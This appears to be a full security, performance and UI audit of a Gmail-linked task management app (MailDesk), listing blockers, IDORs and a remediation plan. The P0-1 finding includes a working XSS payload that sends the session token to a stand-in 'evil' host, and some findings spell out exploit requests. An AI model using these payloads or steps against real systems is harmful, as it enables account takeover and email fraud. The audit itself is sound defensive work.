# K M KOTHARI (MailDesk) — Full Project Audit

**Date:** 2 August 2026
**Commit audited:** `4ef4a17` (branch `main`, clean working tree)
**Scope:** entire repository — 91 tracked files, `server/` (43 files) + `client/src/` (~10.6k lines JSX)
**Method:** six parallel deep-read audits (backend performance, backend security/correctness, frontend↔backend contract, frontend code quality, UI/UX design, feature gaps). ESLint and a production Vite build were executed to measure rather than estimate. Key findings were independently re-verified against the source before inclusion here.

Detailed evidence for every item lives in [`docs/audits/`](audits/):

| File | Contents |
|---|---|
| [`audit-backend-perf.md`](audits/audit-backend-perf.md) | 33 findings — caching, pagination, queues, indexes, N+1, infra |
| [`audit-backend-bugs.md`](audits/audit-backend-bugs.md) | 34 findings — auth, IDOR, XSS, validation, logic bugs |
| [`audit-integration.md`](audits/audit-integration.md) | 28 findings + full 58-row API contract table |
| [`audit-frontend-code.md`](audits/audit-frontend-code.md) | 72 findings — React correctness, perf, a11y, dead code |
| [`audit-ui-design.md`](audits/audit-ui-design.md) | Design audit + complete token set + component specs + screen-by-screen brief |
| [`audit-features.md`](audits/audit-features.md) | Capability matrix + gap analysis + prioritized roadmap |

---

## 1. Executive summary

The application is feature-rich for its age — Gmail OAuth with encrypted multi-account tokens, keyword auto-assignment with a human approval queue, Kanban/Calendar/List task views with drag-and-drop, recurring tasks, five reports with CSV export, and a Gemini-powered summarizer. That is a real product.

It is also **not currently deployable, not safe to expose to inbound email, and not able to run on more than one server instance.** Three separate categories of blocker:

1. **It cannot leave a dev laptop.** The client has zero `import.meta.env` usage and hardcodes `http://localhost:5015` in two files. There is no `client/.env`, despite the README documenting one.
2. **Inbound email can take over an account.** Untrusted Gmail HTML is rendered in an iframe with `sandbox="allow-scripts allow-same-origin"` — a combination that voids the sandbox — while the JWT sits in `localStorage`.
3. **The primary screen crashes on interaction.** Every filter click on the Tasks page throws an uncaught `ReferenceError`, and with no error boundary anywhere the page goes white.

On the optimization question specifically, the answer is unambiguous:

| Technique | Present? |
|---|---|
| Caching (any layer) | **None** |
| Pagination (server-side) | **0 of 11 list endpoints** |
| Background job queue | **None** — Gmail sync, AI calls and SMTP all run inline in the request |
| Database indexes on queried fields | **17 missing** |
| `.lean()` on read paths | **0 uses** |
| Outbound HTTP timeouts / retry / circuit breaker | **None** |
| Multi-instance readiness | **No** — in-memory rate limiter, no Socket.io adapter, unguarded `node-cron` |
| Tests | **0** |
| CI/CD, Docker, deploy config | **None** |
| Error boundary (client) | **0** |
| Code splitting | **None** — single 638 kB chunk |

**Total findings: ~200.** Counts by severity below are deduplicated across the six audits.

| Severity | Count | Meaning |
|---|---|---|
| **P0 — Blocker** | 12 | Ships broken, or exploitable by an outsider |
| **P1 — High** | 41 | Breaks at real load, or a privilege/data-integrity defect |
| **P2 — Medium** | 68 | Wrong behavior, poor UX, or significant tech debt |
| **P3 — Low** | 79 | Cleanup, consistency, polish |

### Verification notes and corrections

Three claims made by individual agents were checked and adjusted:

- **`server/.env` is NOT committed.** One agent reported it was, with secrets needing rotation. Verified false: the file is untracked, matched by `.gitignore:63`, and `git log --all` shows it was never in any commit. Only `server/.env.example` is tracked and it contains `your_jwt_secret`-style placeholders. **No secrets are exposed. Nothing needs rotating.**
- **Both `setSelectedTaskIds` and `setSelectAll` are undefined in `TaskList.jsx`** — `setSelectedTaskIds` at lines 692, 712, 747 and `setSelectAll` at 693, 713, 748. Six `no-undef` errors, confirmed by ESLint.
  > An earlier revision of this document claimed only `setSelectAll` was undefined. That was wrong. The local `grep` is a shell function wrapping **ugrep 7.5.0**, where `\|` alternation silently under-matches — `grep -c "selectedTaskIds\|setSelectAll"` returns 3 where `grep -cE` returns 6. **Use `-E` for alternation in this repo.** The three original audit agents reported this correctly.
- **Invalid Tailwind class count.** Reported variously as 89, 128 and 131 depending on which color families and shade numbers were scanned. The authoritative figure is **128 occurrences of 33 distinct non-existent classes**, measured by building the project and grepping the emitted CSS.

One risk found outside the agents' scope: **`.gitignore` does not cover `client/.env.production`.** The pattern list includes `.env.production.local` but not `.env.production`, which the README instructs you to create. The file does not exist yet, so nothing has leaked — but it will be committed the moment it is created. Fix by replacing the `.env` block with `.env*` plus `!.env.example`.

---

## 2. P0 — Blockers (12)

These must be fixed before any deployment. All are verified.

### P0-1 — Inbound email can steal a session (stored XSS → account takeover)
`server/controllers/gmailController.js:349-423` stores Gmail HTML verbatim. `client/src/pages/TaskList.jsx:1156,1742` renders it via `srcDoc` with `sandbox="allow-scripts allow-same-origin"`. Those two flags together void the sandbox; the iframe reaches `parent.localStorage`, where the JWT lives.

**Exploit:** any stranger emails a connected mailbox with `<img src=x onerror="fetch('//evil/?t='+localStorage.token)">`. Whoever opens the resulting task loses their session. No authentication required by the attacker — just the address.

`EmailInbox.jsx:1343` omits `allow-scripts` and is safe. The root cause is that `renderEmailContent` **exists in two copies that have diverged** — one strips `<script>`, the other does not.

**Fix:** delete `allow-same-origin`, sanitize server-side with `sanitize-html` on ingest, and move the JWT to an httpOnly cookie. Deduplicate the renderer into one component.

### P0-2 — Any Head can send email from the Admin's Gmail account
`server/controllers/gmailController.js:870-981`. `replyToEmail` performs **no ownership check on the email at all**. When the caller doesn't own the target inbox, lines 903-919 explicitly iterate `User.find({ role: 'Admin' })` and borrow the Admin's OAuth tokens to send.

**Exploit:** `POST /api/gmail/emails/<adminEmailId>/reply` sends attacker-authored text from the Admin's real mailbox, into the real thread, to the real client. This is a business-email-compromise primitive. The same fallback exists in `downloadAttachment:1109-1125`.

**Fix:** resolve the sending identity from the authenticated user only; 403 if they don't own the inbox.

### P0-3 — The Tasks page crashes on every filter click
`client/src/pages/TaskList.jsx` calls `setSelectedTaskIds(new Set())` at lines 692, 712, 747 and `setSelectAll(false)` at 693, 713, 748. **Neither is declared in the file** — six `no-undef` errors. Every status-tab, priority, and creator interaction throws an uncaught `ReferenceError`. Leftover from a half-removed bulk-select feature. With **zero error boundaries** in the app, the page unmounts to white.

**Fix:** restore bulk-select properly rather than deleting the calls — `POST /api/tasks/bulk` already exists on the server, fully implemented and never called. Add an error boundary at the route level.

### P0-4 — The client cannot be deployed
Zero `import.meta.env` in the entire client. `src/api/axios.js:5` and `src/components/NotificationBell.jsx:33` hardcode `http://localhost:5015`. No `client/.env` exists despite the README documenting `VITE_API_URL`.

**Fix:** introduce `VITE_API_URL` / `VITE_SOCKET_URL`, add `client/.env` and `client/.env.production`, and fix `.gitignore` first (see §1).

### P0-5 — Every validation failure returns HTTP 500
`server/middleware/validate.js:15` reads `error.errors[0]`, but Zod 4 removed `ZodError.errors` in favor of `.issues`. The catch block itself throws a `TypeError`, so all 13 validated routes return `500 {"message":"Internal Server Error"}` instead of `400` with a field message. Confirmed by executing the project's own `node_modules`.

**Fix:** `safeParse` + `.issues`.

### P0-6 — Admin approval gate is decorative
`server/controllers/authController.js:67` calls `generateToken` unconditionally, before any status gate. A self-registered `Pending` user receives a working 7-day JWT. `loginUser` blocks `Pending`; register does not, and `protect` never reads `status`.

**Fix:** don't issue a token on registration when status is `Pending`; add a status check to `protect`.

### P0-7 — Firing a user does not revoke their session
`server/middleware/authMiddleware.js:20-34` and `index.js:150` check `tokenVersion` but not `status`. `userController.js:160` flips status without bumping `tokenVersion`. A `Rejected` user retains full access for up to 7 days, sockets included.

**Fix:** bump `tokenVersion` on any status/role change; check `status` in `protect`.

### P0-8 — The Gmail permission control is a silent no-op
`server/middleware/schemas.js:30-39` omits `maxConnectedAccounts` and `allowedGmailAccounts` from `updateUserSchema`, and Zod strips unknown keys. `userController.js:108-118` is therefore dead code, the allowlist never populates, and the guard at `gmailController.js:234` never fires. **The admin UI reports success while enforcing nothing** — a restricted Head can connect any account.

### P0-9 — `GET /api/gmail/status` silently destroys Gmail connections
`gmailController.js:814-864` (`deduplicateConnections`), invoked at `:633` on every status poll — from a `GET`. It runs `User.find({})` and hard-nulls tokens for whichever duplicate returns second, with no sort order and no audit. Two users legitimately sharing a mailbox will flip between polls.

**Fix:** delete the call from the GET path; make it an explicit, audited, nightly job.

### P0-10 — `GET /api/gmail/emails` returns every email with images inlined
`gmailController.js:572` — no limit, no `select`, no `.lean()`. Sync inlines every image as a `data:` URI into `Email.body` (`:376-379`), so bodies run 60 KB – 2 MB. At 10k emails that is roughly a 600 MB response. Out-of-memory.

**Fix:** `body: { select: false }` at the schema, paginate 25/page, add a separate detail route.

### P0-11 — Gmail sync runs inline in the HTTP request, fully sequential
`gmailController.js:497-542`, `:336-441`. 150 sequential `messages.get` calls ≈ 30 s per account; an Admin fetch loops all users → a 4–6 minute request that any proxy will kill.

**Fix:** BullMQ worker + `p-limit(10)` + `insertMany`.

### P0-12 — The app cannot run on more than one instance
Three independent causes: `node-cron` is unguarded (`cronJobs.js:14,74`) so every replica runs every job — duplicate notifications, racing syncs, duplicate Tasks via the check-then-act at `taskHelper.js:15`; Socket.io has no Redis adapter (`index.js:128`) so at 3 replicas ~67% of notifications are silently dropped; and the rate limiter is in-memory with no `trust proxy` set.

---

## 3. Security findings (beyond P0)

| ID | Severity | Finding | Location |
|---|---|---|---|
| S-1 | HIGH | **`deleteComment` IDOR** — authorizes against `Task.findById(req.params.id)` but deletes `req.params.commentId`, never comparing `comment.taskId` to the URL task. A Head creates one throwaway task, then deletes any comment in the database through it. *Verified.* | `commentController.js:125-147` |
| S-2 | HIGH | **`bulkAssignEmails` IDOR** — `{_id: {$in: emailIds}}` with no `fetchedBy` scope; copies `email.body` into `Task.description` and returns it. One request exfiltrates arbitrary mailbox bodies. | `gmailController.js:1005-1051` |
| S-3 | HIGH | **Keyword-approval endpoints are workspace-wide for any Head** — `:174` returns every pending email company-wide with full bodies (this is also the ID oracle that makes P0-2, S-2, S-4 and S-5 practical); `:255-260` bulk-approve with no `keyword` sweeps every mailbox to the attacker; `:109/:149` let a Head rewrite or delete the Admin's rules (`createdBy` is stored, never enforced). | `keywordRuleController.js` |
| S-4 | HIGH | **`deleteSingleEmail` has no ownership check** — any Head permanently deletes any Admin email. No soft-delete, no recovery. | `gmailController.js:607-625` |
| S-5 | HIGH | **`createTask` `linkedEmail` IDOR** — pass any email ID; the 201 response populates its `body` and `attachments`, and the email is reassigned as a side effect. | `taskController.js:27,43,53` |
| S-6 | MEDIUM | **Unauthenticated account-lockout DoS** — forgot-password overwrites the victim's password and bumps `tokenVersion` *on request*, with no confirmation step. Knowing an email address is enough to log someone out repeatedly. The temp password is emailed in cleartext, never expires, and is not single-use. | `authController.js:189-191` |
| S-7 | MEDIUM | **`PUT /api/tasks/:id` has no validation at all** — `{"title":123}` → `title.trim is not a function` → 500 after a partial write. No length bound on any string field. | `taskRoutes.js:34` |
| S-8 | MEDIUM | **Token in `localStorage`** — readable by any XSS (see P0-1). No response interceptor, so no 401/429 handling. | `client/src/api/axios.js` |
| S-9 | MEDIUM | **Logout leaks data to the next user** — clears only `token` and `user`; 7 `cached_*` keys persist, including 50 email subjects, senders and body previews. On a shared office machine the next person sees the previous user's mail on first paint. | `Navbar.jsx:29`, `Sidebar.jsx:33` |
| S-10 | LOW (latent) | **`express-mongo-sanitize` on `req.query` is a confirmed no-op under Express 5** (the getter re-parses on access). Not currently exploitable because Express 5's default *simple* query parser cannot produce `$`-keys — but enabling the extended parser silently turns `reportsController.js:28` into live operator injection. Body sanitization does work. | `index.js` |

**Correctly handled — do not "fix" these:** OAuth CSRF is genuinely protected by a 10-minute signed state JWT bound to `userId`. Gmail refresh tokens are AES-256-GCM encrypted (`utils/tokenCrypto.js`). `.env` is properly gitignored and was never committed.

---

## 4. Backend optimization

### 4.1 Caching — nothing exists

There is no Redis, no in-memory cache, no HTTP cache headers, no ETag. Recommended, in order of payoff:

| What to cache | Key | TTL | Invalidate on |
|---|---|---|---|
| Active keyword rules | `rules:active` | 5 min | rule create/update/delete |
| Client list (for sender matching) | `clients:all` | 10 min | client write |
| Report aggregates | `report:<type>:<range>:<userId>` | 15 min | task status change |
| Dashboard KPI counts | `dash:<userId>:<role>` | 60 s | task/email write |
| Gmail access token | `gtok:<userId>:<inbox>` | token expiry − 60 s | reconnect |
| `/auth/me` | `me:<userId>:<tokenVersion>` | 30 s | tokenVersion bump |

The single highest-value one: `KeywordRule.find({isActive:true})` runs **once per Gmail message** (`gmailController.js:394`, inside the loop at `:336`) — roughly 18,000 identical queries per hour at 150 messages × N accounts every 10 minutes.

### 4.2 Pagination — 0 of 11 list endpoints

Unbounded `find()` on: emails, tasks, clients, users, activity logs, notifications, comments, and all report queries. The two most dangerous are `/api/users/activity-logs` and `/api/notifications` — the fastest-growing collections in the system, both returning everything ever created.

The inbox pagination UI is **client-side only**: it downloads the full dataset (bodies plus inlined base64 images) and slices it (`EmailInbox.jsx:158-163`). `TaskList.jsx:226` re-downloads that same payload just to populate a dropdown.

Recommendation: cursor pagination (`_id`-based) for emails and tasks at 25/page; offset is acceptable for admin screens.

### 4.3 Queues — nothing runs in the background

Three workloads run inline in the request/response cycle and must move to a queue (BullMQ + Redis) with retries, exponential backoff and a dead-letter queue:

1. **Gmail sync** (P0-11) — minutes-long, sequential
2. **Nodemailer sends** (`emailHelper.js:41`) — blocks the response on SMTP
3. **Gemini AI calls** (`aiController.js:38`) — blocks the response on a third-party LLM

`node-cron` also needs a distributed lock or a move to BullMQ repeatable jobs (P0-12).

### 4.4 Database

**17 fields queried, sorted or filtered on with no index:** `User.role`, `User.status`, `User.gmailAccessToken`, `Task.clientName`, `Task.createdAt`, `Task.parentTaskId`, `Email.matchedKeyword`, `KeywordRule.isActive`, `KeywordRule.keyword`, plus 5 missing compound (filter + sort) indexes that force in-memory sorts.

**11 confirmed N+1 loops.** The worst:

- `GET /api/clients` loads the **entire Task and Email collections**, then does O(clients × emails) `String.includes()` in JS — roughly 15M synchronous string operations at 100k emails, freezing the event loop for seconds (`clientController.js:12-31`).
- `getClientStats` runs 3 unindexed `countDocuments` **per client** — 50 clients × 100k emails ≈ 7M document examinations, 15–40 s (`reportsController.js:189-220`).
- The overdue cron does O(tasks × supervisors) **sequential** writes every 60 seconds — 500 overdue tasks × 10 supervisors = 6,000 sequential writes per tick, on an unindexed `User.role` scan (`cronJobs.js:39-65`).
- `ensureTaskForEmail` loads the whole `Client` collection **per email** (`taskHelper.js:25`).

**Other:** `.lean()` is used zero times (a free 2–5× win on every read path); 6 JS-side aggregations that should be `$group`/`$facet`; boot runs an unindexable `$nin` full-collection write on every process start (`config/db.js:19-23`), which also has a string-vs-ObjectId mismatch.

### 4.5 Runtime and infrastructure

| Gap | Location | Impact |
|---|---|---|
| `uncaughtException` handler doesn't exit | `index.js:120` | Zombie process stays in the load-balancer rotation |
| `connectDB` swallows failure | `config/db.js:28` | Server starts with no database |
| Health endpoint always returns 200 | `index.js:59` | Readiness checks are meaningless |
| No graceful shutdown | — | In-flight requests dropped on deploy |
| No timeouts on any outbound call | googleapis ×7, Gemini, SMTP | One hung third party exhausts the pool |
| No `compression` middleware | `index.js` | Large JSON sent uncompressed |
| `mongoose.connect` with zero options | `config/db.js` | `socketTimeoutMS: 0` = infinite hang |
| No `trust proxy` | `index.js` | Behind a load balancer all users share one rate-limit bucket |
| No structured logging | — | 80 `console.*` calls, no correlation IDs |

### 4.6 A self-inflicted rate limit

`ProtectedLayout.jsx:55-59` polls `/auth/me` **every 8 seconds** — 450 requests/hour per open tab — against a 300-request/15-minute **per-IP** limiter (`index.js:28-34`). An office behind a single NAT self-throttles at roughly **3 concurrent users**. There is no 429 handling anywhere. A Socket.io connection to the same server already exists and should carry this instead.

---

## 5. Frontend ↔ Backend integration

Good news first: **no client call hits a nonexistent endpoint**, and there are **no HTTP method mismatches**. All 74 call sites map to real routes.

**5 dead server endpoints** (implemented, never called):
- `POST /api/tasks/bulk` — ~70 lines of working controller, route and Zod schema
- `PUT /api/keyword-rules/:id` — **so keyword rules cannot be edited at all**, only deleted and recreated
- `GET /api/users/:id`, `GET /api/tasks/:id`, `GET /api/health`

**Payload mismatches (2):** P0-8; and `DELETE /api/gmail/linked-account`, where the client sends `gmailEmail: ""` for blank accounts but the Zod schema runs `.email()` on it, making the controller's dedicated "clear blank connection" branch unreachable.

**Response mismatch (1):** `Profile.jsx:375` reads `gmailStatus.email`; the server returns `gmailEmail`. The "Inbox Address" field is permanently blank.

**Role mismatches (5):** Head sees a Delete Task button the server 403s; Head sees comment-delete buttons the server rejects; Landing calls an Admin/Head endpoint for every logged-in user including Employees; `/reports` is Admin-gated client-side although the server serves Head and contains Head-scoping logic that can never run; `/inbox` has no client-side role gate while the API is Admin/Head-only and `getEmails` contains an unreachable Employee branch.

**Other integration defects:**
- `express.json()` limit is 100 kb (`index.js:39`) but the AI summarize call posts the full HTML body with inlined base64 images (`EmailInbox.jsx:623`) → **413 on most real email**
- No `AbortController` anywhere — debounced search races resolve last-response-wins rather than last-query-wins; `loadEmails('')` fires twice on inbox mount
- Socket has no `connect_error` handler (auth failure is silent, retries forever) and never re-authenticates after a `tokenVersion` bump; the server's `task:<id>:comment` emits have no subscriber
- Two divergent Client APIs editing the same collection: `/api/tasks/clients` (Admin, bare array) vs `/api/clients` (Admin+Head, `{success,data}`, more fields)
- 7 fetches with no loading state; ~12 errors swallowed to `console.error`; server messages discarded at 5 sites

---

## 6. Frontend code quality

Measured by running ESLint and a production build:

- **100 ESLint problems** — 85 errors, 15 warnings (6 `no-undef`, 42 `no-unused-vars`, 48 `react-hooks/*`)
- **637.96 kB single JS chunk** (160.95 kB gzip), exceeding Vite's own warning threshold. All 12 routes are statically imported in `App.jsx`, so a user at `/login` downloads TaskList, EmailInbox, Reports and socket.io before typing a password.
- **0 tests, 0 error boundaries, 0 `useMemo`/`useCallback`/`memo`, 0 `React.lazy`/`Suspense`, 0 custom hooks, 0 Context/store, no TypeScript, no PropTypes**
- **~500 lines of dead code** — `App.css` (the untouched Vite template, never imported), `moduleCursor.js`, 6 orphan CSS blocks, 3 unused assets

### God components and zero reuse

`TaskList.jsx` is 1,846 lines with 21 `useState`. `EmailInbox.jsx` is 1,529 lines with 28 `useState`. The top 5 files are **56% of all JSX**. No sub-components, no hooks.

Duplication counts: 37 copies of one input class string, 28 of one label string, 16 of the primary-button gradient, **11 hand-rolled modals**, 7 copies of `triggerAlert`, 6 of `getInitials`, 4 of `formatDate`, and the same close-X SVG path 10 times. `renderEmailContent` exists twice and has diverged — which is the direct cause of P0-1.

The current user is re-read and re-parsed from `localStorage` in **12 places with 4 different defaults**. Concrete symptom: updating your Profile refreshes the Sidebar but not the Navbar, which reads `localStorage` inline with no subscription.

### Render performance

EmailInbox makes **at least 9 full passes over the email array per render** (6× `getTabCount`, plus filter, plus `uniqueAccounts`) — on every search keystroke, with no memoization. TaskList's calendar runs `filteredTasks.filter()` inside all 42 day cells, allocating 42×n `Date` objects per render.

`EmailInbox` also issues two identical initial fetches and rebuilds its 5-minute auto-refresh interval on every keystroke. `TaskList.jsx:148` keys an effect on `[tasks]` while reading `location.search`, re-running on all 5 refetch paths.

### Accessibility — effectively absent

For software staff use all day, this is a significant gap:

- **1 `aria-label` in the entire client** (and it's on the wrong element); 2 total `aria-*` attributes
- **64 of 70 `<label>` elements have no `htmlFor`** (only the 3 auth pages do it correctly)
- **0 focus traps, 0 focus restore, 0 ESC handlers, 0 `role="dialog"`** across all 11 modals
- **60 `focus:outline-none` and 1 `focus-visible`** — and `focus:ring-indigo-150` (40 uses) is a nonexistent class, so those fields have **no visible focus ring at all**
- Task cards and email rows are `onClick` `<div>`s with no `tabIndex` — **a keyboard user cannot open a task or read an email**
- 0 `role=`, 0 `sr-only`, no skip link

### Other notable defects

- 4 `URL.createObjectURL` calls, 0 `revokeObjectURL` — unbounded memory growth on the inbox export
- Inbox tab counts use a different filter than the list they label (`EmailInbox.jsx:87` vs `:125`), so badges disagree with rows
- `KeywordApprovalModal` is the only dark-mode-aware component, and `darkMode` is unset in the Tailwind config so it defaults to `'media'` — **that one modal renders dark inside a light app** on any OS set to dark
- No 404 route; `{true && (...)}` dead conditional; kanban rollback restores a stale snapshot, discarding unrelated concurrent updates

---

## 7. UI/UX — from "childish" to professional

Full specification with token values, component dimensions and a screen-by-screen brief is in [`audits/audit-ui-design.md`](audits/audit-ui-design.md). Summary:

### What makes it read as unprofessional

1. **Custom cursor with 5 trailing violet dots**, magnetic buttons that physically move up to 8 px toward the pointer, and click ripples — `utils/cursorEffects.js` (247 lines); `index.css:11-19` disables the native cursor with `cursor: none !important`
2. **3D tilt (±6°) with a cursor-tracking glare overlay on every Dashboard KPI card** — `utils/tiltEffect.js:53`, applied at `Dashboard.jsx:36-42`
3. **26 emoji used as UI icons** — 📋⏳✓⚠️👥✉️ on all 10 Dashboard KPIs, 🔍 as the search-field icon (`EmailInbox.jsx:811`), ↩ as the Reply button (`:1422`) — while ~80 Heroicons SVGs are hand-inlined elsewhere
4. **Count-up slot-machine animations on operational numbers** — 1.5 s of *wrong numbers* on every Dashboard load (`utils/countUp.jsx`)
5. **`from-indigo-600 to-purple-600` gradient on every primary button** (29 instances), plus an Instagram-style indigo→purple→pink gradient ring on the user avatar (`Navbar.jsx:83`)
6. **Neon glow shadows** — every large shadow in the app is indigo-tinted, not neutral (`Dashboard.jsx` ×10, `Landing.jsx:175`, 19 × `shadow-2xl`)
7. **Animated morphing blobs on the login screen** — `Login.jsx:40-42`, plus three 400–500 px `animate-blob` elements with a 25 s infinite `border-radius` morph
8. **513 of 542 font-weight declarations are ≥600** (`font-normal` appears twice) — no typographic hierarchy is possible
9. **Body font is Outfit** — a geometric *display* face for marketing headlines — driving the entire application, loaded via a render-blocking `@import` with 14 weights
10. **40 px and 24 px border radii** — `rounded-[2.5rem]` ×8, `rounded-3xl` ×20, `rounded-xl` ×208 on every input and button
11. **Pulsing and bouncing UI**, including a table status badge (`ManageUsers.jsx:397`) and the Download toolbar button (`EmailInbox.jsx:700`)
12. **The root route `/` is a fake SaaS landing page** — "Trusted by 500+ teams worldwide", 5 invented avatars, hardcoded fake metrics, invented trends ("↑ 12% this week"), and "Start for Free" / "See a Demo" CTAs for products that don't exist

### Broken by the same styling debt

- **128 occurrences of 33 nonexistent Tailwind classes** (the config defines only `slate-450`, `indigo-650`, `emerald-55`)
- **6 CSS classes used 40+ times that are defined nowhere** — `skeleton-shimmer` ×11, `animate-fade-in` ×9, `animate-slide-in` ×7, `hover-glow-card`, `animate-shake`, `custom-scrollbar`. **Every loading skeleton is an inert blank white rectangle.** Ironically `index.css:194` defines `.animate-shimmer` correctly — every call site misspells it.
- **57 inline `style={{}}` objects** mixed into Tailwind, producing four different border radii (6/8/12/16 px) on controls sitting side by side in the Inbox toolbar

### Wrong for an operations tool

- Inbox and Tasks are **card lists at ~90 px row pitch → ~10 rows visible**; a 40 px table row shows 24. No sortable headers, **zero `sticky` in the entire `src/`**, no tabular numerals, numeric columns centered instead of right-aligned.
- **12 `window.confirm()` / `alert()` calls** gate destructive operations, including "clear ALL emails" (`EmailInbox.jsx:550`).
- The toast component is copy-pasted into 7 files; single-toast, no dismiss, no `aria-live`.
- **One keyboard shortcut in the whole app.** No command palette, no saved views. All filters live in local state and are **never reflected in the URL**, so no view can be bookmarked or shared.
- **`select-none` on all 11 page roots — staff cannot copy an email address or a client name.**
- The shell is a scrolling body, and the sidebar is `w-[260px]` against a content offset of `lg:pl-60` (240 px) — **20 px of every page sits underneath the sidebar** (`ProtectedLayout.jsx:68`).

### Recommended design system

**Library: shadcn/ui + Radix + Tailwind**, chosen over Mantine and Ant Design because Tailwind 3 is already the sole styling system across all 10.6k lines (Mantine's emotion and AntD's Less would introduce a competing one); shadcn copies source in with no provider, so migration is file-by-file rather than big-bang on an untested codebase; the CLI supports `tsx: false` for plain JSX; Radix supplies exactly the missing accessibility primitives; and it tree-shakes to ~40 kB against AntD's 200 kB+ baseline. Pair with **TanStack Table v8** (14 kB headless grid), **lucide-react** (eliminates all 26 emoji), **sonner** (eliminates 7 duplicated toast blocks), **cmdk** (command palette), and **recharts** on a lazy-loaded Reports route.

**Tokens (abbreviated — full set in the detail file):**

- **Primary:** blue `#2563EB` / hover `#1D4ED8` / active `#1E40AF` / ring `#3B82F6` — replaces indigo→purple entirely
- **Neutrals (light):** canvas `#F8FAFC`, surface `#FFFFFF`, subtle `#F1F5F9`, borders `#E2E8F0` / `#CBD5E1`, text `#0F172A` / `#475569` / `#64748B`. Note `#94A3B8` currently serves as a label color ~90 times and **fails WCAG AA at 2.85:1** — demote it to disabled-only.
- **Neutrals (dark):** `#0B1220` / `#111827` / `#1B2432` / `#273244`; text `#F1F5F9` / `#CBD5E1` / `#94A3B8`
- **Semantic:** success `#16A34A`, warning `#D97706`, danger `#DC2626`, info `#0284C7`
- **Type:** Inter, self-hosted, weights **400/500/600 only**; scale 11/12/13/14/16/18/20/24 with fixed line heights; `tabular-nums` on all numeric cells
- **Radius:** 2/4/**6 (controls)**/8 (cards)/10 (modals); `rounded-full` for avatars only
- **Shadows:** 4 neutral steps, **no colored shadows** — elevation comes from 1 px `#E2E8F0` borders
- **Layout:** topbar 48 px, sidebar 240/56 px, content padding 24 px, **no max-width on data screens** (`max-w-7xl` currently caps tables at 1280 px)
- **Motion:** 150 ms, opacity and transform only, with a `prefers-reduced-motion` block; delete every infinite animation except the skeleton shimmer

---

## 8. Feature gaps

### What exists and works

Gmail OAuth with multi-account and AES-256-GCM encrypted tokens; keyword auto-assignment with a human approval queue; email→task conversion including bulk assign; Kanban + Calendar + List task views with drag-and-drop; task comments; recurring tasks; five reports with CSV export; Gemini email summarizer; attachment download proxy; mobile drawer navigation; `.xls` inbox backup; server-side email **subject/sender** search.

### Partial

Reply (plain-text only, and never persisted locally — so the app cannot show that a reply happened); Gmail labels (read-only); activity log (missing IP, target and before/after values; user create, role-change and delete are never logged); recurrence (only regenerates on completion); the client model links to tasks by **string name** rather than by reference.

### Absent

`threadId`/conversation view · SLA and response-time metrics · read/unread/star/snooze/archive · compose/forward/drafts/attachments/signatures/templates · body-level search · collision detection · subtasks · time tracking · task search and pagination · custom roles · teams/departments · SSO · 2FA · notification preferences and digests · WhatsApp/Slack integration · retention and GDPR policy · tests · CI · Docker · i18n · PWA

### Top 10 highest-ROI additions

Ranked by value per unit of effort, with P0 fixes included because they gate everything else:

| # | Item | Effort | Why |
|---|---|---|---|
| 1 | Externalize API + Socket URLs | S | Blocks all deployment; real-time notifications are dead in production |
| 2 | Fix the TaskList filter crash | S | Primary screen is broken on interaction |
| 3 | Fix the iframe XSS | S | Any stranger with the email address can take an account |
| 4 | **Email threading (`threadId`)** | L | Gmail already returns it and `gmailController.js:936` reads then **discards** it. Prerequisite for 5 other features. |
| 5 | Persist replies + SLA analytics | M+M | Unlocks first-response and resolution time; today responsiveness is literally unmeasurable |
| 6 | Tame the overdue cron | S | Currently notifies the assignee **and every Admin/Head every minute, forever** — ~2,880 notification rows per supervisor for a task 2 days late |
| 7 | Authorization-matrix tests + CI | M | Role logic is reimplemented differently in 4 controllers with zero tests — this is why §3 has 5 IDORs |
| 8 | AI: extract action items → prefill task | S–M | Gemini is already wired; removes the most repetitive human step in the whole workflow |
| 9 | Collision detection / inbox ownership | M | Shared mailboxes with zero protection against two people replying at once; Socket.io rooms already exist, unused |
| 10 | Complete audit trail + soft-delete offboarding | M+S | Role changes are unlogged, and `deleteUser` erases the departing user's logs and comments |

### One silent data-corruption bug worth its own callout

`server/utils/taskHelper.js:35`: when an inbound sender matches no client, the code assigns `clientName = clients[0].name` rather than leaving it unattributed. Because `seedClients()` runs on **every server boot** (`config/db.js:14`), `clients[0]` is typically a *seeded demo client*. Every unmatched email is therefore silently attributed to a fake client, quietly corrupting every client-level report. Verified.

---

## 9. Recommended remediation plan

### Phase 0 — Stop the bleeding (2–3 days)
All 12 P0 blockers. Individually small; collectively the difference between deployable and not. Includes deleting the three orphaned `setSelectAll` calls, removing `allow-same-origin`, adding an ownership check to `replyToEmail`, fixing `validate.js` to use `.issues`, adding `VITE_API_URL`, and fixing `.gitignore` to `.env*`.

### Phase 1 — Security hardening (3–4 days)
The 5 IDORs (S-1 through S-5), the forgot-password DoS, `PUT /api/tasks/:id` validation, JWT → httpOnly cookie, clearing `cached_*` on logout, and a `status` check in `protect`. Write the authorization-matrix tests here — they are what prevents the next IDOR.

### Phase 2 — Make it scale (5–7 days)
Indexes and `.lean()` first (cheapest, largest win), then server-side pagination on all 11 endpoints, then Redis caching per §4.1, then BullMQ for Gmail sync / SMTP / Gemini, then the multi-instance fixes (Redis Socket.io adapter, cron locking, `trust proxy`, rate-limit store). Replace the 8-second `/auth/me` poll with the existing socket.

### Phase 3 — UI foundation (2.5 days)
Phases 0+1 of the design plan: delete cursor/tilt/blob/count-up/pulse effects and the 5 dead files, fix the 20 px sidebar offset, set `darkMode: 'class'`, then the token config, self-hosted Inter, and a codemod sweep over the 128 broken classes, 513 heavy font weights, radii, shadows, gradients and focus rings. **This alone removes essentially every "childish" element at near-zero regression risk** and is the fastest visible win in the entire plan.

### Phase 4 — UI rebuild (13 days)
Primitive component library (24 components, replacing 11 hand-rolled modals and 7 toast copies), lucide icons, real dialogs replacing the 12 `confirm`/`alert` calls, the fixed app shell, ⌘K palette, then `DataTable` on TanStack and the rebuild of EmailInbox (table + reading-pane drawer), TaskList, the admin screens, Dashboard and Reports.

### Phase 5 — Engineering foundations (ongoing, start immediately)
ESLint in CI (would have caught P0-3), Vitest + React Testing Library, Playwright for the auth and email→task flows, Dockerfile + compose, GitHub Actions, Sentry, structured logging, branch protection on `main`.

### Phase 6 — Features
Roadmap in §8 and the detail file, sequenced behind threading as the structural prerequisite.

---

## 10. Cross-cutting root causes

Most of the ~200 findings trace back to four systemic gaps. Fixing these prevents recurrence better than fixing the symptoms:

